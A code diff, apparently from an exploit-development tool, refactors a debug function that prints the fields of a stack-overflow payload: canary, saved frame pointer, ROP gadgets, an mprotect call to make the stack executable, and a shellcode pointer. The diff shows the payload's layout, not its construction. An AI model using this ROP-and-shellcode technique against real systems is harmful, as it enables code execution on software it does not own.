@@ -66,11 +66,9 @@ l_popRDX:	 // Fallback gadget for "POP RDX"
 	return makeShellcode(&plp->pl_scu.sc, p, np);
 } // makeload()
 
-static char *p8(void *s0) {
-	static char d[sizeof(Pointer)];
+static char *p8(void *s0, char *d) {
 	char *s = (char *) s0;
 
-	assert(sizeof(d) == 8);
 	for (int i = 0; i < sizeof(Pointer); i++)
 		d[i] = ((s[i] < ' ') || (s[i] > '~')) ? '.' : s[i];
 
@@ -79,22 +77,25 @@ static char *p8(void *s0) {
 
 void dumpload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr) {
 	char fmt[] = "%20s: %018p (\"%.8s\")\n";
+	char d[sizeof(Pointer)];
+
+	assert(sizeof(d) == 8);
 
 	fprintf(stderr, "--------------------------------------------\n");
-	fprintf(stderr, fmt, "pl_dst.p",        plp->pl_dst.p,       p8(&plp->pl_dst));
+	fprintf(stderr, fmt, "pl_dst.p",        plp->pl_dst.p,       p8(&plp->pl_dst,        d));
 
-	fprintf(stderr, fmt, "pl_canary.p",     plp->pl_canary.p,    p8(&plp->pl_canary));
-	fprintf(stderr, fmt, "pl_rbp.p",        plp->pl_rbp.p,       p8(&plp->pl_rbp));
+	fprintf(stderr, fmt, "pl_canary.p",     plp->pl_canary.p,    p8(&plp->pl_canary,     d));
+	fprintf(stderr, fmt, "pl_rbp.p",        plp->pl_rbp.p,       p8(&plp->pl_rbp,        d));
 
-	fprintf(stderr, fmt, "pl_popRDI.p",     plp->pl_popRDI.p,    p8(&plp->pl_popRDI));
-	fprintf(stderr, fmt, "pl_stackPage.p",  plp->pl_stackPage.p, p8(&plp->pl_stackPage));
-	fprintf(stderr, fmt, "pl_popRSI.p",     plp->pl_popRSI.p,    p8(&plp->pl_popRSI));
-	fprintf(stderr, fmt, "pl_stackSize",    plp->pl_stackSize,   p8(&plp->pl_stackSize));
-	fprintf(stderr, fmt, "pl_popRDX.p",     plp->pl_popRDX.p,    p8(&plp->pl_popRDX));
-	fprintf(stderr, fmt, "pl_permission.p", plp->pl_permission,  p8(&plp->pl_permission));
-	fprintf(stderr, fmt, "pl_mprotect.p",   plp->pl_mprotect.p,  p8(&plp->pl_mprotect));
+	fprintf(stderr, fmt, "pl_popRDI.p",     plp->pl_popRDI.p,    p8(&plp->pl_popRDI,     d));
+	fprintf(stderr, fmt, "pl_stackPage.p",  plp->pl_stackPage.p, p8(&plp->pl_stackPage,  d));
+	fprintf(stderr, fmt, "pl_popRSI.p",     plp->pl_popRSI.p,    p8(&plp->pl_popRSI,     d));
+	fprintf(stderr, fmt, "pl_stackSize",    plp->pl_stackSize,   p8(&plp->pl_stackSize,  d));
+	fprintf(stderr, fmt, "pl_popRDX.p",     plp->pl_popRDX.p,    p8(&plp->pl_popRDX,     d));
+	fprintf(stderr, fmt, "pl_permission.p", plp->pl_permission,  p8(&plp->pl_permission, d));
+	fprintf(stderr, fmt, "pl_mprotect.p",   plp->pl_mprotect.p,  p8(&plp->pl_mprotect,   d));
 	
-	fprintf(stderr, fmt, "pl_shellCode.p",  plp->pl_shellCode.p, p8(&plp->pl_shellCode));
+	fprintf(stderr, fmt, "pl_shellCode.p",  plp->pl_shellCode.p, p8(&plp->pl_shellCode,  d));
 
 	dumpShellcode(&plp->pl_scu.sc);
 	fprintf(stderr, "--------------------------------------------\n");
